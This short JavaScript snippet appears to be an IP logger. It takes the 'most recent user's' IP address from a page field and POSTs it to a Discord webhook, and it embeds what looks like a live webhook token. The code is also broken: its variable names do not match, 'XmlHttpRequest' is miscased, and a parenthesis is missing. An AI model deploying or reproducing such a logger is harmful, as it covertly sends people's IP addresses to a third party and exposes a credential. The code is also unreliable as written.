function sendit(){
  let apiipify = document.getElementById('ipadress').value;
  const webhook = 'https://discord.com/api/webhooks/1344183803521798225/fysjbtXpNhQWLoS2CmyqTiIdiKLeD053oMc9H2z5hyb8uYqCB8NDE38gUkma2uJ7LAEb';
  const contents = `the ip address of the most recent user is ${apiify}`;
  const request = new XmlHttpRequest();
  request.open("POST", webhook);
  request.setRequestHeader('Content-type','application/json';
  const params = {
    content: contents
  }
  request.send(JSON.stringify(params));
  alert(apiify);
}
